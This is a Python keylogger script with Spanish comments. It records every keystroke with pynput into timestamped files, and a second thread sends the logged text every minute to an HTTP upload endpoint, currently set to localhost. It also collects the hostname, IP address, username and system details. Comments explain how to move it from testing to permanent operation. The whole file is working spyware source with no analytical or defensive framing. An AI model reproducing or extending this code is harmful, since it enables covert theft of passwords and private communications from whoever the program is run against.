# Lib para el uso de hilos
import threading
# Lib para pruebas con sleep
import time
## Librerías para keylogger
# Lib para la fecha
import datetime
# Lib para capturar las teclas presionadas.
from pynput.keyboard import Listener, Controller
# Lib para mostrar el sistema operativo.
import os
# Lib para conocer el IP.
import socket
# Lib para conocer el Sistema Operativo.
import platform
# 
import getpass
# Lib para consultas HTML
import requests
# Lib para utilizar expresiones regulares.
import re 

# Proceso para capturar y escribir en un docuemento las teclas presionadas.
def key_recorder(key):
      d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')
      # d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
      # Cargamos en key el valor de la tecla presionada.
      key=str(key)

      # Abrimos el archivo con nombre de la fecha de creación
      f= open('keylogger_{}.txt'.format(d),'a')
      
       # SOLO PARA LA FASE DE PRUEBAS, permite salir del programa
      if key == "'\\x03'":
            f.close()
            os.system('whoami')
            hostname = socket.gethostname()
            IP = socket.gethostbyname(hostname)
            architecture=platform.architecture()
            processor=platform.processor()
            userName = getpass.getuser()
            print("**********")
            print(hostname)
            print(IP)
            print(architecture)
            print(processor)
            print(userName)
            print("**********")
            quit()

      # Usando expresiones regulares buscamos palabras que sean
      # Key, para colocarlas con []
      if re.match('Key.*', key):
            key = '[' + key + ']'
            key = key.replace("Key.","")
            f.write(key)
      else:
            key = key.replace("'", "")
            f.write(key)


# Código para iniciar el keylogger
def keylogger():
      print('invocando al Keylogger, HILO 1')
      # Código 
     

      with Listener(on_press=key_recorder) as l:
            l.join()



def uploadData():
      # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
      i = 0

      # Para hacer pruebas. Para un funcionamiento permantente, comentar por "while True"
      while i<100000:
            print('Proceso upload corriendo ... ')
            
            # Lógica principal del programa 
            text = ''
            d=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')
            time.sleep(60)
            try:
                  f= open('keylogger_{}.txt'.format(d),'r')
                  print('Leyendo')
                  text = f.read()
                  response = requests.get('http://localhost:5000/upload/' + text )

                  if response:
                        print('Info cargada exitosamente')
                  else:
                        print('Error cargando la info')


            except Exception as e:
                  print('No encontrado')


            # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
            i = i + 1
      
      print('me morí')


def mainProcess():
      print('Proceso principal.')
      
      p01 = threading.Thread(name='Keylogger', target=keylogger)
      p02 = threading.Thread(name='uploadData', target=uploadData)

      p01.start()
      p02.start()

mainProcess()